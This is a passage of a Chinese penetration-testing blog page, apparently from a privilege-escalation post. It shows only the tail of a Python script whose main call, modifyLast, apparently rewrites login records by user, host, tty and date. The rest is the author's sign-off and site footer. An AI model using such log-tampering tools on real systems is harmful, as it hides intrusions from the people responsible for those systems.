+            <span class="n">modifyLast</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">TTYNAME</span> <span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">DATELINE</span><span class="p">)</span>
+
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">parser</span><span class="o">.</span><span class="n">print_help</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="0x10-结束">0x10 结束</h1>
+<p>又2点了，抽支烟就该洗洗睡了，晚安~</p>
+
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">F0rmat</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2019-09-09
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">CC BY-NC-ND 4.0</a></span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://xxe.icu/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+          <a href="https://xxe.icu/tags/%E6%8F%90%E6%9D%83/">提权</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/seacms-front-desk-getshell/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">Seacms&lt;=9.92前台Getshell</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/an-app-distribution-system-upload-vulnerability/">
+            <span class="next-text nav-default">某云分发APP上传漏洞</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+    <div class="post bg-white">
+      <script src="https://utteranc.es/client.js"
+            repo= "Secd0g/comment"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+      </script>
+    </div>
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="https://github.com/Secd0g/" rel="me noopener" class="iconfont"
+      title="github"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M512 12.672c-282.88 0-512 229.248-512 512 0 226.261333 146.688 418.133333 350.08 485.76 25.6 4.821333 34.986667-11.008 34.986667-24.618667 0-12.16-0.426667-44.373333-0.64-87.04-142.421333 30.890667-172.458667-68.693333-172.458667-68.693333C188.672 770.986667 155.008 755.2 155.008 755.2c-46.378667-31.744 3.584-31.104 3.584-31.104 51.413333 3.584 78.421333 52.736 78.421333 52.736 45.653333 78.293333 119.850667 55.68 149.12 42.581333 4.608-33.109333 17.792-55.68 32.426667-68.48-113.706667-12.8-233.216-56.832-233.216-253.013333 0-55.893333 19.84-101.546667 52.693333-137.386667-5.76-12.928-23.04-64.981333 4.48-135.509333 0 0 42.88-13.738667 140.8 52.48 40.96-11.392 84.48-17.024 128-17.28 43.52 0.256 87.04 5.888 128 17.28 97.28-66.218667 140.16-52.48 140.16-52.48 27.52 70.528 10.24 122.581333 5.12 135.509333 32.64 35.84 52.48 81.493333 52.48 137.386667 0 196.693333-119.68 240-233.6 252.586667 17.92 15.36 34.56 46.762667 34.56 94.72 0 68.522667-0.64 123.562667-0.64 140.202666 0 13.44 8.96 29.44 35.2 24.32C877.44 942.592 1024 750.592 1024 524.672c0-282.752-229.248-512-512-512"></path>
+</svg>
+
+    </a>
+  
+    <a href="https://www.zhihu.com/people/F0rmat" rel="me noopener" class="iconfont"
+      title="zhihu"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
+  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://xxe.icu/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - <a class="theme-link" href="https://github.com/xianmin/hugo-theme-jane">Jane</a>
+  </span>
+
+  <span class="copyright-year">
+    &copy;
+    
+      2017 -
+    2022
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        F0rmat
+        
+      </span></span>
+
+  
+  
+    <span id="busuanzi_container">
+      访客数/访问量：<span id="busuanzi_value_site_uv"></span>/<span id="busuanzi_value_site_pv"></span>
+    </span>
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
